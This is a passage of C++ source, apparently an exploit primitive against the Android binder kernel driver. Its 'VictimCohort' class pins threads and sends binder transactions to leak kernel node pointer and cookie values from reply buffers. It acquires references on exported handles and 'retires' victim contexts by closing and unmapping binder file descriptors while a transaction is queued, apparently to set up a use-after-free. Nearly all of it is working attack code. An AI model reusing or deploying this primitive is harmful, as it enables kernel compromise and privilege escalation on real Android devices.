        result.duration_nanoseconds = boot_nanoseconds() - started;
        result.detail = "status=fail reason=route opened=" +
                std::to_string(opened_count) + " expected=" +
                std::to_string(victim_count);
        if (output != nullptr) {
            *output = result;
        }
        emit(sink, sink_context, started, result.stage.c_str(),
                result.detail);
        return nullptr;
    }

    for (int index = 0; index < victim_count; ++index) {
        State::Route* route = &state->routes[index];
        route->export_thread = std::thread([route, index]() {
            bool pinned = pin_current_thread(2);
            binder_transaction_data transaction {};
            transaction.target.handle = static_cast<std::uint32_t>(
                    route->target_handle);
            transaction.code = kControlledExportCode + index + 1;
            BinderReply reply = pinned
                    ? transact_and_read(route->fd, transaction)
                    : BinderReply {};
            bool shape = reply.ioctl_result == 0 &&
                    reply.terminal_response == BR_REPLY &&
                    reply.buffer != 0 && reply.offsets != 0 &&
                    reply.data_size == 44 &&
                    reply.offsets_size == sizeof(binder_size_t);
            binder_size_t offset = UINT64_MAX;
            flat_binder_object object {};
            if (shape) {
                std::memcpy(&offset,
                        reinterpret_cast<const void*>(reply.offsets),
                        sizeof(offset));
                shape = offset == 0;
            }
            if (shape) {
                std::memcpy(&object,
                        reinterpret_cast<const void*>(reply.buffer),
                        sizeof(object));
                shape = object.hdr.type == BINDER_TYPE_HANDLE &&
                        object.handle > 0;
            }
            if (shape) {
                const auto* data =
                        reinterpret_cast<const std::uint8_t*>(
                                reply.buffer);
                std::memcpy(&route->token.pointer,
                        data + 28, sizeof(route->token.pointer));
                std::memcpy(&route->token.cookie,
                        data + 36, sizeof(route->token.cookie));
                shape = route->token.pointer != 0 &&
                        route->token.cookie != 0;
            }
            if (shape) {
                constexpr std::size_t kHandleCommandSize =
                        sizeof(std::uint32_t) + sizeof(std::uint32_t);
                constexpr std::size_t kFreeCommandSize =
                        sizeof(std::uint32_t) +
                        sizeof(binder_uintptr_t);
                std::uint8_t commands[
                        2 * kHandleCommandSize + kFreeCommandSize] {};
                std::uint32_t handle = object.handle;
                write_command(commands, BC_INCREFS, &handle,
                        sizeof(handle));
                write_command(commands + kHandleCommandSize,
                        BC_ACQUIRE, &handle, sizeof(handle));
                write_command(commands + 2 * kHandleCommandSize,
                        BC_FREE_BUFFER, &reply.buffer,
                        sizeof(reply.buffer));
                shape = write_binder_commands(
                        route->fd, commands, sizeof(commands)) == 0;
            } else if (reply.buffer != 0) {
                free_buffer(route->fd, reply.buffer);
            }
            if (shape) {
                route->exported_handle =
                        static_cast<int>(object.handle);
                route->export_passed = true;
            }
        });
    }

    result.passed = true;
    result.duration_nanoseconds = boot_nanoseconds() - started;
    result.detail = "status=pass routes=" +
            std::to_string(victim_count) + " exports=started";
    emit(sink, sink_context, started, result.stage.c_str(),
            result.detail);
    if (output != nullptr) {
        *output = result;
    }
    return std::unique_ptr<VictimCohort>(
            new VictimCohort(std::move(state)));
}

Result VictimCohort::collect(std::vector<VictimToken>* tokens) {
    const std::uint64_t started = boot_nanoseconds();
    Result result;
    result.stage = "victim-cohort-collect";
    bool pass = state_ != nullptr && !state_->collected &&
            !state_->released && tokens != nullptr;
    std::set<std::uint64_t> pointers;
    if (pass) {
        tokens->clear();
        tokens->reserve(state_->routes.size());
        for (State::Route& route : state_->routes) {
            if (route.export_thread.joinable()) {
                route.export_thread.join();
            }
            pass = route.export_passed && route.exported_handle > 0 &&
                    route.token.pointer != 0 && route.token.cookie != 0 &&
                    pointers.insert(route.token.pointer).second && pass;
            tokens->push_back(route.token);
        }
    }
    if (pass) {
        state_->collected = true;
    } else if (tokens != nullptr) {
        tokens->clear();
    }
    result.passed = pass;
    result.duration_nanoseconds = boot_nanoseconds() - started;
    result.detail = "status=" + std::string(pass ? "pass" : "fail") +
            " tokens=" + std::to_string(
                    tokens == nullptr ? 0 : tokens->size());
    return result;
}

Result VictimCohort::retire(
        int victim, std::uint64_t settle_microseconds) {
    const std::uint64_t started = boot_nanoseconds();
    Result result;
    result.stage = "victim-context-retire";
    int index = victim - 1;
    bool indexed = state_ != nullptr && index >= 0 &&
            index < static_cast<int>(state_->routes.size());
    State::Route* route = indexed ? &state_->routes[index] : nullptr;
    bool preflight = route != nullptr && state_->collected &&
            !state_->released && route->export_passed &&
            !route->retired && route->fd >= 0 &&
            route->mapping != MAP_FAILED &&
            route->exported_handle > 0 &&
            settle_microseconds <= 1'000'000;
    bool pinned = preflight && pin_current_thread(2);
    binder_transaction_data transaction {};
    if (route != nullptr) {
        transaction.target.handle = static_cast<std::uint32_t>(
                route->exported_handle);
    }
    transaction.code = kControlledHoldCode;
    std::uint8_t command[
            sizeof(std::uint32_t) + sizeof(transaction)] {};
    write_command(command, BC_TRANSACTION, &transaction,
            sizeof(transaction));
    int queued = pinned ? write_binder_commands(
            route->fd, command, sizeof(command)) : -1;
    bool unmapped = queued == 0 && munmap(
            route->mapping, kBinderMappingSize) == 0;
    if (unmapped) {
        route->mapping = MAP_FAILED;
    }
    bool closed = unmapped && close(route->fd) == 0;
    if (closed) {
        route->fd = -1;
        route->retired = true;
        if (settle_microseconds > 0) {
            usleep(static_cast<useconds_t>(settle_microseconds));
        }
    }
    bool pass = preflight && pinned && queued == 0 && unmapped && closed;
    result.passed = pass;
    result.duration_nanoseconds = boot_nanoseconds() - started;
    result.detail = "status=" + std::string(pass ? "pass" : "fail") +
            " victim=" + std::to_string(victim) +
            " queued=" + std::to_string(queued) +
            " unmapped=" + std::to_string(unmapped ? 1 : 0) +
            " closed=" + std::to_string(closed ? 1 : 0) +
            " settle_us=" + std::to_string(settle_microseconds);
    return result;
}

Result VictimCohort::release() {
    const std::uint64_t started = boot_nanoseconds();
    Result result;
    result.stage = "victim-cohort-release";
    bool pass = state_ != nullptr && state_->collected &&
            !state_->released;
    int retired = 0;
    int cleaned = 0;
    int released_handles = 0;
    for (State::Route& route : state_->routes) {
        if (route.retired) {
            bool exact = route.fd < 0 && route.mapping == MAP_FAILED;
            pass = pass && exact;
            retired += exact ? 1 : 0;
            continue;
        }
        bool valid_handles = route.target_handle > 0 &&
                route.exported_handle > 0 &&
                route.target_handle != route.exported_handle;
        std::array<std::uint32_t, 2> handles {
                valid_handles
                        ? static_cast<std::uint32_t>(route.target_handle)
                        : 0,
                valid_handles
                        ? static_cast<std::uint32_t>(route.exported_handle)
                        : 0,
        };
        constexpr std::size_t kHandleCommandSize =
                sizeof(std::uint32_t) + sizeof(std::uint32_t);
        std::vector<std::uint8_t> commands(
                handles.size() * 2 * kHandleCommandSize);
        std::size_t offset = 0;
        for (std::uint32_t handle : handles) {
            write_command(commands.data() + offset,
                    BC_RELEASE, &handle, sizeof(handle));
            offset += kHandleCommandSize;
            write_command(commands.data() + offset,
                    BC_DECREFS, &handle, sizeof(handle));
            offset += kHandleCommandSize;
        }
        bool handles_released = route.fd >= 0 && valid_handles &&
                write_binder_commands(route.fd, commands.data(),
                        commands.size()) == 0;
        bool unmapped = handles_released &&
                route.mapping != MAP_FAILED &&
                munmap(route.mapping, kBinderMappingSize) == 0;
        if (unmapped) {
            route.mapping = MAP_FAILED;
        }
        bool closed = unmapped && route.fd >= 0 &&
                close(route.fd) == 0;
        if (closed) {
            route.fd = -1;
            ++cleaned;
            released_handles += 2;
        }
        pass = pass && handles_released && unmapped && closed;
    }
    pass = pass && retired + cleaned ==
            static_cast<int>(state_->routes.size()) &&
            released_handles == cleaned * 2;
    if (pass) {
        state_->released = true;
    }
    result.passed = pass;
    result.duration_nanoseconds = boot_nanoseconds() - started;
    result.detail = "status=" + std::string(pass ? "pass" : "fail") +
            " contexts=" + std::to_string(state_->routes.size()) +
            " retired=" + std::to_string(retired) +
            " cleaned=" + std::to_string(cleaned) +
            " handles_released=" + std::to_string(released_handles);
    return result;
}

VictimCohort::~VictimCohort() {
    if (state_ == nullptr || state_->released) {
        return;
    }
    for (State::Route& route : state_->routes) {
        if (route.fd >= 0) {
            close(route.fd);
            route.fd = -1;
        }
    }
    for (State::Route& route : state_->routes) {
        if (route.export_thread.joinable()) {
            route.export_thread.join();
        }
        if (route.mapping != MAP_FAILED) {
            munmap(route.mapping, kBinderMappingSize);
            route.mapping = MAP_FAILED;
        }
    }
}

}  // namespace prism::primitive
